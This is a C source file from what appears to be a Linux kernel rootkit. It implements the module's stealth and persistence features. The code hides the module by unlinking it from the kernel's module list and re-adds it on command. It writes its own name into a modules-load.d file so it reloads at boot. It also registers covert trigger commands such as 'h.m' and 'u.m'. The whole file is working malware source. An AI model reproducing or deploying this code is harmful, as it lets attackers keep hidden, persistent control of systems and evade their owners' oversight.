// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/module.h>

/* Module hiding: remove/restore THIS_MODULE from the module list */

static struct list_head *saved_prev;

void rk_module_hide(void)
{
	if (saved_prev)
		return;
	saved_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}

void rk_module_unhide(void)
{
	if (!saved_prev)
		return;
	list_add(&THIS_MODULE->list, saved_prev);
	saved_prev = NULL;
}

/* Persistence: write/clear /etc/modules-load.d entry */

static int rk_persist(void)
{
	struct file *f;
	loff_t pos = 0;

	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return PTR_ERR(f);
	kernel_write(f, MODULE_NAME_STR "\n", sizeof(MODULE_NAME_STR), &pos);
	filp_close(f, NULL);
	return 0;
}

static int rk_unpersist(void)
{
	struct file *f;
	loff_t pos = 0;

	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return PTR_ERR(f);
	kernel_write(f, "", 0, &pos);
	filp_close(f, NULL);
	return 0;
}

/* Command handlers */

static int cmd_persist(const char *arg)
{
	return rk_persist();
}

static int cmd_unpersist(const char *arg)
{
	return rk_unpersist();
}

static int cmd_hide_module(const char *arg)
{
	rk_module_hide();
	return 0;
}

static int cmd_unhide_module(const char *arg)
{
	rk_module_unhide();
	return 0;
}

int rk_module_init(void)
{
	int ret;

	ret = rk_cmd_register("persist", cmd_persist);
	if (ret)
		return ret;
	ret = rk_cmd_register("unpersist", cmd_unpersist);
	if (ret)
		return ret;
	ret = rk_cmd_register("h.m", cmd_hide_module);
	if (ret)
		return ret;
	ret = rk_cmd_register("u.m", cmd_unhide_module);
	if (ret)
		return ret;
	return 0;
}
